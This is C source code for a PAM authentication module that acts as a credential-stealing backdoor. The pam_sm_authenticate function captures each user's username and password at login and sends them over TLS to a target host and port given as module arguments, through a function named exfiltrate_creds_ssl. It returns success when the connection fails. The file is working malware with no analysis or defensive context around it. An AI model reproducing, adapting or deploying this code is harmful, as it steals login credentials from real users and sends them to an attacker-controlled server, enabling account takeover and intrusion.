#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define TARGET_TAG_STRING "target=" 
#define PORT_TAG_STRING "port="
#define NEW_LINE "\n"
#define UNKNOW_PASSWORD_STRING "\b\n\r"
#define ERROR_INT -1

typedef struct {
   char  target[256];
   long   port;
} Args_t;


Args_t* parse_args(int argc, const char **argv)
{
	Args_t *args = NULL;
	int i;

	/* Allocating args with 0s */
	args = calloc( 1, sizeof( *args ) );
	if ( NULL == args ){
		return NULL;
	}

	/* Parsing parameters */
	for( i = 0 ; i < argc ; i++ ) {
		if( strncmp( argv[i], TARGET_TAG_STRING, sizeof(TARGET_TAG_STRING) - 1) == 0 ) {
			strncpy( args->target, argv[i] + ( sizeof(TARGET_TAG_STRING) - 1 ), sizeof(args->target) - 1 );
		} else if( strncmp(argv[i], PORT_TAG_STRING, sizeof(PORT_TAG_STRING) -1 ) == 0 ) {
			//args->port = strtol(argv[i], argv[i] , 10);
			args->port = atoi(argv[i] + ( sizeof(PORT_TAG_STRING) - 1 ) );
		}
	}

	/* If any empty parameter return NULL */
	if ('\0' == args->target[0] || '\0' == args->port ) {
		return NULL;
	}


	return args;
}

int open_socket(const char *hostname, long port)
{
	int sock;
	struct sockaddr_in server;
	
	//Create socket
	sock = socket(AF_INET , SOCK_STREAM , 0);

	if (sock == -1) {
		return ERROR_INT;
	}
	
	server.sin_addr.s_addr = inet_addr( hostname );
	server.sin_family = AF_INET;
	server.sin_port = htons( port );

	if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0){
		return ERROR_INT;
	}
	return sock;
}

SSL_CTX* init_ctx()
{
	SSL_CTX *ctx;
	const SSL_METHOD *method;

	OpenSSL_add_all_algorithms();
	SSL_load_error_strings();
	method = TLS_client_method();
	ctx = SSL_CTX_new(method);
	return ctx;
}

void exfiltrate_creds_ssl(SSL *ssl_socket,const char *username,const char *password)
{
	
	//Send data
	SSL_write(ssl_socket , (const void *) username , strlen(username));
	SSL_write(ssl_socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1);
	SSL_write(ssl_socket , (const void *) password , strlen(password));
	SSL_write(ssl_socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1);
	SSL_write(ssl_socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1);

}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, const char **argv)
{
	int pam_code;
	int socket;
	const char *username = NULL;
	const char *password = NULL;
	Args_t* args;
	SSL *ssl;
	SSL_CTX *ctx;

	/* Getting the username */
	pam_code = pam_get_user(handle, &username, "USERNAME: ");
	if (pam_code != PAM_SUCCESS) {
		fprintf(stderr, "Can't get username");
		return PAM_AUTH_ERR;
	}

	password = NULL;

	/* Getting the password */
	pam_code = pam_get_authtok(handle, PAM_AUTHTOK, &password, "Password: ");
	if (pam_code != PAM_SUCCESS) {
		fprintf(stderr, "Can't get password");
		return PAM_AUTH_ERR;
	}

	// If PAM cannot get password from unknown user, password will be replaced with "\b\n\r\177INCORRECT"
	if ( 0 == strncmp(password, UNKNOW_PASSWORD_STRING, sizeof(UNKNOW_PASSWORD_STRING) - 1 ) ) {
		return PAM_AUTH_ERR;
	}

	if ( NULL == (args = parse_args(argc, argv)) ) {
		return PAM_AUTH_ERR;
	}

	socket = open_socket( args->target, args->port);
	if ( ERROR_INT == socket ) {
		return PAM_SUCCESS;
	}

	ctx = init_ctx();
	ssl = SSL_new(ctx);
	/* Attach socket descriptor*/
	SSL_set_fd(ssl, socket);
	if (ERROR_INT == SSL_connect(ssl)) {
		return PAM_SUCCESS;
	} else {
		exfiltrate_creds_ssl(ssl, username, password);
	}

	close(socket);

	printf("");

	memset(args, 0, sizeof(*args));
	free(args);
	return PAM_SUCCESS;
}
